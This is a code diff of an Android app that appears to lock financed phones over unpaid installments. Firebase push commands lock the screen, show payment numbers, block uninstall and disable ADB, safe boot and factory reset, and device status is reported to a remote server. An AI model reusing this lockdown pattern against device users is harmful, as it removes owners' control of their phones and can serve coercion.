@@ -1,16 +1,16 @@
 package com.uztech.phonelock
 
 import android.Manifest
+import android.annotation.SuppressLint
 import android.content.pm.PackageManager
 import android.telephony.TelephonyManager
 import android.os.Build
 import androidx.core.content.ContextCompat
-
 import java.net.HttpURLConnection
 import java.net.URL
-
 import android.app.Activity
 import android.app.ActivityManager
+import android.app.AppOpsManager
 import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Context
@@ -28,6 +28,9 @@ import androidx.appcompat.app.AppCompatActivity
 import com.google.android.gms.tasks.OnCompleteListener
 import com.google.firebase.messaging.FirebaseMessaging
 import java.util.*
+import android.app.AlertDialog
+import android.os.UserManager
+import android.net.Uri
 
 class MainActivity : AppCompatActivity() {
 
@@ -83,6 +86,11 @@ class MainActivity : AppCompatActivity() {
             disableFactoryReset()
         }
 
+        // Factory Reset Buttons
+        findViewById<Button>(R.id.btnOverlayPermanentOn).setOnClickListener {
+            enablePermanentOverlayViaFCM()
+        }
+
         // Start foreground service
         startForegroundServiceForFCM()
 
@@ -92,7 +100,16 @@ class MainActivity : AppCompatActivity() {
         // Auto checks
         checkFCMStatus()
         updateStatus()
+        // Device Owner check
+        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+        val admin = ComponentName(this, DeviceAdminReceiver::class.java)
+        if (dpm.isDeviceOwnerApp(packageName)) {
+            // Start permanent overlay
+            startService(Intent(this, PermanentOverlayService::class.java))
 
+            // Enable lock task mode
+            enableLockTaskMode()
+        }
         // Check permissions
         checkPermissions()
 
@@ -100,14 +117,28 @@ class MainActivity : AppCompatActivity() {
         checkAndRestoreLockState()
     }
 
+    private fun enableLockTaskMode() {
+        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+        val admin = ComponentName(this, DeviceAdminReceiver::class.java)
+
+        // White list this app for lock task
+        dpm.setLockTaskPackages(admin, arrayOf(packageName))
+
+        // Start lock task
+        startLockTask()
+
+        // Optional: Hide system UI
+        dpm.setLockTaskFeatures(admin,
+            DevicePolicyManager.LOCK_TASK_FEATURE_NONE)
+    }
+
     private fun checkAndRestoreLockState() {
         val wasLocked = prefs.getBoolean("was_locked_before_reboot", false)
 
         if (wasLocked) {
-            // Lock was active - restore it (no time limit check)
             handler.postDelayed({
                 lockTouchScreen()
-            }, 2000) // Delay to ensure UI is ready
+            }, 2000)
         }
     }
 
@@ -130,7 +161,230 @@ class MainActivity : AppCompatActivity() {
     }
 
     // ==============================================
-    // ✅ HANDLE FCM NOTIFICATIONS
+    // ✅ PERMANENT OVERLAY PERMISSION VIA FCM
+    // ==============================================
+
+    // FCM দিয়ে Overlay Permission ON করার function
+    fun enablePermanentOverlayViaFCM() {
+        Log.d(FCM_LOG_TAG, "🔄 Processing FCM Overlay Enable Command")
+
+        // Step 1: Check if Device Owner
+        if (!isDeviceOwner()) {
+            Toast.makeText(this,
+                "❌ Device Owner permission required\n" +
+                        "Use ADB: adb shell dpm set-device-owner com.uztech.phonelock/.DeviceAdminReceiver",
+                Toast.LENGTH_LONG).show()
+            return
+        }
+
+        try {
+            // Step 2: Ensure OUR app has overlay permission
+            ensureOurAppOverlayPermission()
+
+            // Step 3: Apply Device Owner restrictions to make it permanent
+            applyPermanentOverlayRestrictions()
+
+            // Step 4: Save state
+            prefs.edit().apply {
+                putBoolean("overlay_permanent_enabled", true)
+                apply()
+            }
+
+            // Step 5: Show success message
+            Toast.makeText(this,
+                "✅ Overlay Permission Permanently Enabled\n" +
+                        "• Your app overlay always ON\n" +
+                        "• Child cannot disable\n" +
+                        "• Lock screen always works",
+                Toast.LENGTH_LONG).show()
+
+            Log.d(FCM_LOG_TAG, "✅ Overlay permanently enabled via FCM")
+            updateStatus()
+
+        } catch (e: Exception) {
+            Log.e(FCM_LOG_TAG, "❌ Failed to enable overlay: ${e.message}")
+            Toast.makeText(this, "Failed: ${e.message}", Toast.LENGTH_SHORT).show()
+        }
+    }
+
+    // FCM দিয়ে Overlay Permission OFF করার function
+    fun disablePermanentOverlayViaFCM() {
+        Log.d(FCM_LOG_TAG, "🔄 Processing FCM Overlay Disable Command")
+
+        if (!isDeviceOwner()) {
+            Toast.makeText(this, "Device Owner permission needed", Toast.LENGTH_LONG).show()
+            return
+        }
+
+        try {
+            // Remove restrictions
+            removeOverlayRestrictions()
+
+            // Save state
+            prefs.edit().apply {
+                putBoolean("overlay_permanent_enabled", false)
+                apply()
+            }
+
+            Toast.makeText(this,
+                "✅ Overlay Restrictions Removed\n" +
+                        "• User can now change overlay settings\n" +
+                        "• Your app overlay may be disabled",
+                Toast.LENGTH_LONG).show()
+
+            Log.d(FCM_LOG_TAG, "✅ Overlay restrictions removed via FCM")
+            updateStatus()
+
+        } catch (e: Exception) {
+            Log.e(FCM_LOG_TAG, "❌ Failed to disable overlay: ${e.message}")
+            Toast.makeText(this, "Failed: ${e.message}", Toast.LENGTH_SHORT).show()
+        }
+    }
+
+    // আমাদের App এর Overlay Permission ensure করা
+    private fun ensureOurAppOverlayPermission() {
+        if (!checkOverlayPermission()) {
+            // Auto open settings for permission
+            autoOpenOverlaySettings()
+        }
+    }
+
+    // Automatic Settings open
+    private fun autoOpenOverlaySettings() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
+            intent.data = Uri.parse("package:$packageName")
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+
+            // Show alert before opening
+            AlertDialog.Builder(this)
+                .setTitle("Overlay Permission Required")
+                .setMessage("Your app needs Overlay Permission to lock screen. Please enable it.")
+                .setPositiveButton("Open Settings") { _, _ ->
+                    startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST)
+                }
+                .setCancelable(false)
+                .show()
+        }
+    }
+
+    @SuppressLint("NewApi")
+    private fun applyPermanentOverlayRestrictions() {
+        if (!isDeviceOwner()) return
+
+        try {
+            // 1. Block app uninstall
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                devicePolicyManager.setUninstallBlocked(
+                    componentName,
+                    packageName,
+                    true
+                )
+                Log.d(FCM_LOG_TAG, "App uninstall blocked")
+            }
+
+            // 2. Disable Developer Options
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
+                Settings.Global.putInt(
+                    contentResolver,
+                    Settings.Global.DEVELOPMENT_SETTINGS_ENABLED,
+                    0
+                )
+                Log.d(FCM_LOG_TAG, "Developer Options disabled")
+            }
+
+            // 3. Disable ADB Debugging
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
+                Settings.Global.putInt(
+                    contentResolver,
+                    Settings.Global.ADB_ENABLED,
+                    0
+                )
+                Log.d(FCM_LOG_TAG, "ADB Debugging disabled")
+            }
+
+            // 4. Add User Restrictions
+            val restrictions = arrayOf(
+                UserManager.DISALLOW_SAFE_BOOT,
+                UserManager.DISALLOW_FACTORY_RESET,
+                UserManager.DISALLOW_DEBUGGING_FEATURES,
+                UserManager.DISALLOW_INSTALL_UNKNOWN_SOURCES,
+                UserManager.DISALLOW_CONFIG_BRIGHTNESS,
+                UserManager.DISALLOW_CONFIG_DATE_TIME
+            )
+
+            for (restriction in restrictions) {
+                try {
+                    devicePolicyManager.addUserRestriction(componentName, restriction)
+                    Log.d(FCM_LOG_TAG, "Restriction added: $restriction")
+                } catch (e: Exception) {
+                    Log.e(FCM_LOG_TAG, "Failed to add $restriction: ${e.message}")
+                }
+            }
+
+        } catch (e: Exception) {
+            Log.e(FCM_LOG_TAG, "Failed to apply restrictions: ${e.message}")
+            throw e
+        }
+    }
+
+    @SuppressLint("NewApi")
+    private fun removeOverlayRestrictions() {
+        if (!isDeviceOwner()) return
+
+        try {
+            // 1. Allow app uninstall
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                devicePolicyManager.setUninstallBlocked(
+                    componentName,
+                    packageName,
+                    false
+                )
+            }
+
+            // 2. Enable Developer Options
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
+                Settings.Global.putInt(
+                    contentResolver,
+                    Settings.Global.DEVELOPMENT_SETTINGS_ENABLED,
+                    1
+                )
+            }
+
+            // 3. Enable ADB Debugging
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
+                Settings.Global.putInt(
+                    contentResolver,
+                    Settings.Global.ADB_ENABLED,
+                    1
+                )
+            }
+
+            // 4. Remove User Restrictions
+            val restrictions = arrayOf(
+                UserManager.DISALLOW_SAFE_BOOT,
+                UserManager.DISALLOW_FACTORY_RESET,
+                UserManager.DISALLOW_DEBUGGING_FEATURES,
+                UserManager.DISALLOW_INSTALL_UNKNOWN_SOURCES,
+                UserManager.DISALLOW_CONFIG_BRIGHTNESS,
+                UserManager.DISALLOW_CONFIG_DATE_TIME
+            )
+
+            for (restriction in restrictions) {
+                try {
+                    devicePolicyManager.clearUserRestriction(componentName, restriction)
+                } catch (e: Exception) {
+                    // Ignore
+                }
+            }
+
+        } catch (e: Exception) {
+            Log.e(FCM_LOG_TAG, "Failed to remove restrictions: ${e.message}")
+        }
+    }
+
+    // ==============================================
+    // ✅ UPDATED FCM NOTIFICATION HANDLER
     // ==============================================
 
     private fun handleFCMNotification() {
@@ -162,6 +416,7 @@ class MainActivity : AppCompatActivity() {
                     }
                 }, 1000)
             }
+
             lowerBody.contains("account status is now inactive") -> {
                 Log.d(FCM_LOG_TAG, "✅ Found INACTIVE command - UNLOCKING SCREEN")
                 handler.postDelayed({
@@ -170,12 +425,43 @@ class MainActivity : AppCompatActivity() {
                     }
                 }, 1000)
             }
+
             lowerBody.contains("account status is now pending") -> {
                 Log.d(FCM_LOG_TAG, "✅ Found PENDING command - ENABLING FACTORY RESET")
                 handler.postDelayed({
                     enableFactoryReset()
                 }, 1000)
             }
+
+            // ✅ NEW: Overlay Permanent Enable via FCM
+            lowerBody.contains("overlay permanent on") ||
+                    lowerBody.contains("overlay always on") ||
+                    lowerBody.contains("enable overlay permanent") -> {
+                Log.d(FCM_LOG_TAG, "✅ Found OVERLAY PERMANENT ON command")
+                handler.postDelayed({
+                    enablePermanentOverlayViaFCM()
+                }, 1000)
+            }
+
+            // ✅ NEW: Overlay Restrictions Remove via FCM
+            lowerBody.contains("overlay permanent off") ||
+                    lowerBody.contains("disable overlay permanent") ||
+                    lowerBody.contains("remove overlay restrictions") -> {
+                Log.d(FCM_LOG_TAG, "✅ Found OVERLAY PERMANENT OFF command")
+                handler.postDelayed({
+                    disablePermanentOverlayViaFCM()
+                }, 1000)
+            }
+
+            // ✅ NEW: Check Status via FCM
+            lowerBody.contains("status") ||
+                    lowerBody.contains("check status") -> {
+                Log.d(FCM_LOG_TAG, "✅ Found STATUS CHECK command")
+                handler.postDelayed({
+                    sendStatusToServer()
+                }, 1000)
+            }
+
             else -> {
                 Log.d(FCM_LOG_TAG, "ℹ️ No lock/unlock command found in body")
                 if (title != null) {
@@ -186,7 +472,98 @@ class MainActivity : AppCompatActivity() {
     }
 
     // ==============================================
-    // ✅ FOREGROUND SERVICE
+    // ✅ STATUS MONITORING & REPORTING
+    // ==============================================
+
+    private fun sendStatusToServer() {
+        val status = getDeviceStatus()
+        val deviceId = Settings.Secure.getString(contentResolver,
+            Settings.Secure.ANDROID_ID) ?: "unknown"
+
+        val statusUrl = "https://ephonelocker.info/api/update-status?imei=$deviceId&status=${Uri.encode(status)}"
+
+        Thread {
+            try {
+                val urlObj = URL(statusUrl)
+                val connection = urlObj.openConnection() as HttpURLConnection
+                connection.requestMethod = "POST"
+                connection.setRequestProperty("User-Agent", "Android-App")
+
+                val responseCode = connection.responseCode
+                Log.d("StatusUpdate", "Response Code: $responseCode")
+
+                if (responseCode == 200) {
+                    Log.d(FCM_LOG_TAG, "✅ Status sent to server")
+                }
+            } catch (e: Exception) {
+                Log.e("StatusUpdate", "Error: ${e.message}")
+            }
+        }.start()
+    }
+
+    private fun getDeviceStatus(): String {
+        return StringBuilder().apply {
+            append("Device Owner: ${if (isDeviceOwner()) "✅" else "❌"}\n")
+            append("Device Admin: ${if (devicePolicyManager.isAdminActive(componentName)) "✅" else "❌"}\n")
+            append("Overlay Permission: ${if (checkOverlayPermission()) "✅" else "❌"}\n")
+            append("Screen Locked: ${if (isTouchLocked) "🔒" else "🔓"}\n")
+            append("Overlay Permanent: ${if (prefs.getBoolean("overlay_permanent_enabled", false)) "✅" else "❌"}\n")
+            append("Factory Reset: ${if (prefs.getBoolean(KEY_FACTORY_RESET_DISABLED, false)) "🔒" else "🔓"}")
+        }.toString()
+    }
+
+    // ==============================================
+    // ✅ UPDATED STATUS DISPLAY
+    // ==============================================
+
+    private fun updateStatus() {
+        val status = StringBuilder("📱 PhoneLock Status\n\n")
+
+        val isAdminActive = devicePolicyManager.isAdminActive(componentName)
+        val isDeviceOwner = isDeviceOwner()
+        val isFactoryResetDisabled = prefs.getBoolean(KEY_FACTORY_RESET_DISABLED, false)
+        val fcmToken = getStoredToken()
+        val isServiceRunning = isForegroundServiceRunning()
+        val hasOverlayPermission = checkOverlayPermission()
+        val isOverlayPermanent = prefs.getBoolean("overlay_permanent_enabled", false)
+
+        // Device Admin Status
+        status.append(if (isAdminActive) "✅ Device Admin Active\n" else "❌ Device Admin Inactive\n")
+
+        // Device Owner Status
+        status.append(if (isDeviceOwner) "✅ Device Owner Active\n" else "❌ Device Owner Inactive\n")
+
+        // Factory Reset Status
+        if (isDeviceOwner) {
+            status.append(if (isFactoryResetDisabled) "🔒 Factory Reset DISABLED\n" else "🔓 Factory Reset ENABLED\n")
+        }
+
+        // Overlay Status
+        status.append(if (hasOverlayPermission) "✅ Overlay Permission Granted\n" else "❌ Overlay Permission Needed\n")
+
+        if (isOverlayPermanent && isDeviceOwner) {
+            status.append("🔒 Overlay Permanent: ENABLED\n")
+        }
+
+        // Touch Lock Status
+        status.append(if (isTouchLocked) "🔒 Touch LOCKED (Pending Payment)\n" else "✅ Touch Ready\n")
+
+        if (isTouchLocked) {
+            status.append("📱 Bkash: 01996914242\n")
+            status.append("💳 Nagad: 01996914242\n")
+        }
+
+        // FCM Status
+        status.append(if (fcmToken != null) "✅ FCM Token Available\n" else "❌ No FCM Token\n")
+
+        // Service Status
+        status.append(if (isServiceRunning) "✅ Background Service Running\n" else "⚠ Service Stopped\n")
+
+        tvStatus.text = status.toString()
+    }
+
+    // ==============================================
+    // ✅ EXISTING FUNCTIONS (UNCHANGED)
     // ==============================================
 
     private fun startForegroundServiceForFCM() {
@@ -207,6 +584,7 @@ class MainActivity : AppCompatActivity() {
         return manager.getRunningServices(Integer.MAX_VALUE)
             .any { it.service.className == ForegroundNotificationService::class.java.name }
     }
+
 
     // ==============================================
     // FCM TOKEN MANAGEMENT
@@ -255,121 +633,12 @@ class MainActivity : AppCompatActivity() {
             val deviceId = Settings.Secure.getString(contentResolver,
                 Settings.Secure.ANDROID_ID) ?: "unknown"
 
-            // Register device to your API
-            val registerUrl = "https://ephonelocker.info/api/register?imei_number=$deviceId&name=${Build.MANUFACTURER} ${Build.MODEL}&phone=01700000009&email=$deviceId@example.com&address=Dhaka, Bangladesh&nominee_name=Nominee Name&nominee_phone=01800000009&total_amount=50000&down_payment=10000&interval_type=1&interval_value=6&payable_amount=40000&per_installment=3333.33&bill_date=2025-01-15&admin_id=2"
-            Log.d("RequestURL", "URL: $registerUrl")
-
-            Thread {
-                try {
-                    val urlObj = URL(registerUrl)
-                    val connection = urlObj.openConnection() as HttpURLConnection
-                    connection.requestMethod = "POST"
-                    connection.setRequestProperty("User-Agent", "Android-App")
-                    connection.setRequestProperty("Accept", "application/json")
-                    connection.instanceFollowRedirects = false
-
-                    val responseCode = connection.responseCode
-                    Log.d("POST Response", "Response Code: $responseCode")
-
-                    // Check for redirects
-                    if (responseCode == HttpURLConnection.HTTP_MOVED_TEMP ||
-                        responseCode == HttpURLConnection.HTTP_MOVED_PERM ||
-                        responseCode == HttpURLConnection.HTTP_SEE_OTHER) {
-                        val location = connection.getHeaderField("Location")
-                        Log.d("Redirect", "Redirected to: $location")
-
-                        runOnUiThread {
-                            Toast.makeText(this@MainActivity,
-                                "Server redirected to login page. Endpoint may require auth.",
-                                Toast.LENGTH_LONG).show()
-                        }
-                        return@Thread
-                    }
-
-                    // Read response
-                    val response = if (responseCode == HttpURLConnection.HTTP_OK) {
-                        connection.inputStream.bufferedReader().use { it.readText() }
-                    } else {
-                        connection.errorStream.bufferedReader().use { it.readText() }
-                    }
-
-                    // Log only first 500 chars
-                    val preview = if (response.length > 500) response.substring(0, 500) + "..." else response
-                    Log.d("POST Response", "Preview: $preview")
-
-                    // Check if response is HTML
-                    val isHtml = response.contains("<html", ignoreCase = true)
-                    Log.d("ResponseType", "Is HTML: $isHtml")
-
-                    runOnUiThread {
-                        if (isHtml) {
-                            Toast.makeText(this@MainActivity,
-                                "Server returned HTML page. Check endpoint URL or authentication.",
-                                Toast.LENGTH_LONG).show()
-                        } else if (responseCode == 200) {
-                            Toast.makeText(this@MainActivity, "Device registered successfully!", Toast.LENGTH_SHORT).show()
-                        } else {
-                            Toast.makeText(this@MainActivity,
-                                "Registration Error: $responseCode", Toast.LENGTH_SHORT).show()
-                        }
-                    }
-
-                } catch (e: Exception) {
-                    Log.e("POST Error", e.toString(), e)
-                    runOnUiThread {
-                        Toast.makeText(this@MainActivity,
-                            "Registration Error: ${e.message}", Toast.LENGTH_SHORT).show()
-                    }
-                }
-            }.start()
-
-            // Save FCM token to your API
-            val tokenUrl = "https://ephonelocker.info/api/save-firebase-token?token=$token&imei=$deviceId"
-            Log.d("RequestURL", "Token URL: $tokenUrl")
-
-            Thread {
-                try {
-                    val urlObj = URL(tokenUrl)
-                    val connection = urlObj.openConnection() as HttpURLConnection
-                    connection.requestMethod = "POST"
-                    connection.setRequestProperty("User-Agent", "Android-App")
-                    connection.setRequestProperty("Accept", "application/json")
-                    connection.instanceFollowRedirects = false
-
-                    val responseCode = connection.responseCode
-                    Log.d("Token POST", "Response Code: $responseCode")
-
-                    if (responseCode == HttpURLConnection.HTTP_MOVED_TEMP ||
-                        responseCode == HttpURLConnection.HTTP_MOVED_PERM ||
-                        responseCode == HttpURLConnection.HTTP_SEE_OTHER) {
-                        val location = connection.getHeaderField("Location")
-                        Log.d("Token Redirect", "Redirected to: $location")
-                        return@Thread
-                    }
-
-                    val response = if (responseCode == HttpURLConnection.HTTP_OK) {
-                        connection.inputStream.bufferedReader().use { it.readText() }
-                    } else {
-                        connection.errorStream.bufferedReader().use { it.readText() }
-                    }
-
-                    val isHtml = response.contains("<html", ignoreCase = true)
-
-                    runOnUiThread {
-                        if (!isHtml && responseCode == 200) {
-                            Toast.makeText(this@MainActivity, "Token saved to server!", Toast.LENGTH_SHORT).show()
-                        }
-                    }
-
-                } catch (e: Exception) {
-                    Log.e("Token POST Error", e.toString(), e)
-                }
-            }.start()
+            // Register device (run in background)
+            sendRegistrationData(deviceId, token)
 
             // Save token locally
             saveToken(token)
 
-            // Show to user
             Toast.makeText(
                 this,
                 "Token saved! Check Logcat for full token",
@@ -378,6 +647,68 @@ class MainActivity : AppCompatActivity() {
 
             updateStatus()
         })
+    }
+
+    private fun sendRegistrationData(deviceId: String, token: String) {
+        Thread {
+            try {
+                // Register device
+                val registerUrl = "https://ephonelocker.info/api/register?imei_number=$deviceId&name=${Build.MANUFACTURER} ${Build.MODEL}&phone=01700000009&email=$deviceId@example.com&address=Dhaka, Bangladesh&nominee_name=Nominee Name&nominee_phone=01800000009&total_amount=50000&down_payment=10000&interval_type=1&interval_value=6&payable_amount=40000&per_installment=3333.33&bill_date=2025-01-15&admin_id=2"
+                Log.d("RequestURL", "Register URL: $registerUrl")
+
+                sendPostRequest(registerUrl)
+
+                // Save FCM token to server
+                val tokenUrl = "https://ephonelocker.info/api/save-firebase-token?token=$token&imei=$deviceId"
+                Log.d("RequestURL", "Token URL: $tokenUrl")
+
+                sendPostRequest(tokenUrl)
+
+            } catch (e: Exception) {
+                Log.e("Registration", "Error: ${e.message}")
+                runOnUiThread {
+                    Toast.makeText(this@MainActivity,
+                        "Registration error: ${e.message}", Toast.LENGTH_SHORT).show()
+                }
+            }
+        }.start()
+    }
+
+    private fun sendPostRequest(urlString: String) {
+        try {
+            val urlObj = URL(urlString)
+            val connection = urlObj.openConnection() as HttpURLConnection
+            connection.requestMethod = "POST"
+            connection.setRequestProperty("User-Agent", "Android-App")
+            connection.setRequestProperty("Accept", "application/json")
+            connection.connectTimeout = 10000
+            connection.readTimeout = 10000
+
+            val responseCode = connection.responseCode
+            Log.d("POST Response", "Response Code: $responseCode")
+
+            val response = if (responseCode == HttpURLConnection.HTTP_OK) {
+                connection.inputStream.bufferedReader().use { it.readText() }
+            } else {
+                connection.errorStream?.bufferedReader()?.use { it.readText() } ?: "No response"
+            }
+
+            Log.d("POST Response", "Response: ${if (response.length > 200) response.substring(0, 200) + "..." else response}")
+
+            runOnUiThread {
+                if (responseCode == 200) {
+                    Toast.makeText(this, "Server request successful", Toast.LENGTH_SHORT).show()
+                } else {
+                    Toast.makeText(this, "Server returned: $responseCode", Toast.LENGTH_SHORT).show()
+                }
+            }
+
+        } catch (e: Exception) {
+            Log.e("POST Error", e.toString())
+            runOnUiThread {
+                Toast.makeText(this, "Error: ${e.message}", Toast.LENGTH_SHORT).show()
+            }
+        }
     }
 
     private fun saveToken(token: String) {
@@ -393,9 +724,6 @@ class MainActivity : AppCompatActivity() {
         return prefs.getString("fcm_token", null)
     }
 
-    // ==============================================
-    // TOUCH LOCK FUNCTIONS (REBOOT PROOF)
-    // ==============================================
     fun lockTouchScreen(): Boolean {
         if (!checkOverlayPermission()) {
             requestOverlayPermission()
@@ -408,33 +736,18 @@ class MainActivity : AppCompatActivity() {
         }
 
         try {
-            // Start persistent lock service
-            startPersistentLockService()
-
-            // Apply lock
             lockManager.lockTouchScreen()
             vibratePhone(200)
-
-            Toast.makeText(this,
-                "🔒 Touch locked for Pending Payment.\n" +
-                        "Please contact for payment.\n" +
-                        "Thanks",
-                Toast.LENGTH_SHORT
-            ).show()
-
             isTouchLocked = true
             touchLockStartTime = System.currentTimeMillis()
 
-            // Save lock state for reboot recovery (NO TIME LIMIT)
             prefs.edit().apply {
                 putBoolean("was_locked_before_reboot", true)
                 putLong("lock_start_time", touchLockStartTime)
                 apply()
             }
 
-            // NO AUTO-UNLOCK SCHEDULED
-            // Lock will remain until FCM notification unlocks it
-
+            Toast.makeText(this, "🔒 Screen locked", Toast.LENGTH_SHORT).show()
             updateStatus()
             return true
         } catch (e: Exception) {
@@ -451,15 +764,10 @@ class MainActivity : AppCompatActivity() {
         }
 
         try {
-            // Stop persistent lock service
-            stopPersistentLockService()
-
-            // Remove lock
             lockManager.unlockTouchScreen()
             vibratePhone(100)
             isTouchLocked = false
 
-            // Clear lock state
             prefs.edit().apply {
                 putBoolean("was_locked_before_reboot", false)
                 remove("lock_start_time")
@@ -469,39 +777,12 @@ class MainActivity : AppCompatActivity() {
             Toast.makeText(this, "✅ Screen unlocked", Toast.LENGTH_SHORT).show()
             updateStatus()
             return true
-
         } catch (e: Exception) {
             Toast.makeText(this, "❌ Unlock failed: ${e.message}", Toast.LENGTH_SHORT).show()
-            // Force clear state even if unlock fails
             isTouchLocked = false
             prefs.edit().putBoolean("was_locked_before_reboot", false).apply()
             updateStatus()
             return false
-        }
-    }
-
-    private fun startPersistentLockService() {
-        try {
-            val serviceIntent = Intent(this, PersistentLockService::class.java)
-            serviceIntent.action = PersistentLockService.ACTION_START_LOCK
-
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(serviceIntent)
-            } else {
-                startService(serviceIntent)
-            }
-        } catch (e: Exception) {
-            Log.e(FCM_LOG_TAG, "Failed to start persistent service: ${e.message}")
-        }
-    }
-
-    private fun stopPersistentLockService() {
-        try {
-            val serviceIntent = Intent(this, PersistentLockService::class.java)
-            serviceIntent.action = PersistentLockService.ACTION_STOP_LOCK
-            startService(serviceIntent)
-        } catch (e: Exception) {
-            Log.e(FCM_LOG_TAG, "Failed to stop persistent service: ${e.message}")
         }
     }
 
@@ -521,7 +802,7 @@ class MainActivity : AppCompatActivity() {
             )
             try {
                 startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST)
-                Toast.makeText(this, "Please enable 'Display over other apps' permission", Toast.LENGTH_LONG).show()
+                Toast.makeText(this, "Please enable Overlay Permission", Toast.LENGTH_LONG).show()
             } catch (e: Exception) {
                 val intentFallback = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                     data = android.net.Uri.parse("package:$packageName")
@@ -544,10 +825,6 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // ==============================================
-    // DEVICE ADMIN & DEVICE OWNER FUNCTIONS
-    // ==============================================
-
     private fun enableDeviceAdmin() {
         if (!devicePolicyManager.isAdminActive(componentName)) {
             val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
@@ -561,10 +838,6 @@ class MainActivity : AppCompatActivity() {
             Toast.makeText(this, "✅ Device admin already enabled", Toast.LENGTH_SHORT).show()
         }
     }
-
-    // ==============================================
-    // FACTORY RESET CONTROL FUNCTIONS
-    // ==============================================
 
     private fun disableFactoryReset() {
         if (!devicePolicyManager.isAdminActive(componentName)) {
@@ -641,59 +914,6 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // ==============================================
-    // STATUS UPDATE
-    // ==============================================
-
-    private fun updateStatus() {
-        val status = StringBuilder("📱 PhoneLock Status\n\n")
-
-        val isAdminActive = devicePolicyManager.isAdminActive(componentName)
-        val isDeviceOwner = isDeviceOwner()
-        val isFactoryResetDisabled = prefs.getBoolean(KEY_FACTORY_RESET_DISABLED, false)
-        val fcmToken = getStoredToken()
-        val isServiceRunning = isForegroundServiceRunning()
-        val hasOverlayPermission = checkOverlayPermission()
-
-        // Device Admin Status
-        status.append(if (isAdminActive) "✅ Device Admin Active\n" else "❌ Device Admin Inactive\n")
-
-        // Device Owner Status
-        status.append(if (isDeviceOwner) "✅ Device Owner Active\n" else "❌ Device Owner Inactive\n")
-
-        // Factory Reset Status
-        if (isDeviceOwner) {
-            status.append(if (isFactoryResetDisabled) "✅ Factory Reset DISABLED\n" else "⚠ Factory Reset ENABLED\n")
-        } else {
-            status.append("⚠ Factory Reset: Need Device Owner\n")
-        }
-
-        // Touch Lock Status
-        status.append(if (isTouchLocked) "🔒 Touch LOCKED (Pending Payment)\n" else "✅ Touch Ready\n")
-
-        if (isTouchLocked) {
-            status.append("📱 Bkash: 0188XXXXXXXXX\n")
-            status.append("💳 Nagad: 0131XXXXXXXXX\n")
-            status.append("📞 Contact: 017XXXXXXXX\n\n")
-        }
-
-        // FCM Status
-        status.append(if (fcmToken != null) "✅ FCM Token Available\n" else "❌ No FCM Token\n")
-
-        // Service Status
-        status.append(if (isServiceRunning) "✅ Background Service Running\n" else "⚠ Service Stopped\n")
-
-        // Permission Status
-        if (!hasOverlayPermission) {
-            status.append("⚠ Overlay Permission Needed\n")
-        }
-
-        tvStatus.text = status.toString()
-    }
-
-    // ==============================================
-    // ACTIVITY LIFECYCLE
-    // ==============================================
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
         super.onActivityResult(requestCode, resultCode, data)
 
@@ -710,12 +930,8 @@ class MainActivity : AppCompatActivity() {
             OVERLAY_PERMISSION_REQUEST -> {
                 if (checkOverlayPermission()) {
                     Toast.makeText(this, "✅ Overlay permission granted", Toast.LENGTH_SHORT).show()
-
-                    // Try to lock again if it was attempted before permission
                     if (prefs.getBoolean("was_locked_before_reboot", false)) {
-                        handler.postDelayed({
-                            lockTouchScreen()
-                        }, 1000)
+                        handler.postDelayed({ lockTouchScreen() }, 1000)
                     }
                 } else {
                     Toast.makeText(this, "❌ Overlay permission denied", Toast.LENGTH_SHORT).show()
@@ -725,40 +941,25 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // ==============================================
-    // ACTIVITY Resume
-    // ==============================================
     override fun onResume() {
         super.onResume()
         updateStatus()
-
-        // Check if we need to restore lock from service
         val wasLocked = prefs.getBoolean("was_locked_before_reboot", false)
         if (wasLocked && !isTouchLocked) {
-            handler.postDelayed({
-                lockTouchScreen()
-            }, 1500)
+            handler.postDelayed({ lockTouchScreen() }, 1500)
         }
     }
 
     override fun onNewIntent(intent: Intent) {
         super.onNewIntent(intent)
-
-        // Set the new intent so we can read extras
         setIntent(intent)
-
-        Log.d(FCM_LOG_TAG, "🔄 onNewIntent called - app was already running")
-
-        // Handle FCM notifications again
+        Log.d(FCM_LOG_TAG, "🔄 onNewIntent called")
         handleFCMNotification()
-
-        // Update status
         updateStatus()
     }
 
     override fun onDestroy() {
         super.onDestroy()
-        // Clean up
         handler.removeCallbacksAndMessages(null)
     }
 }
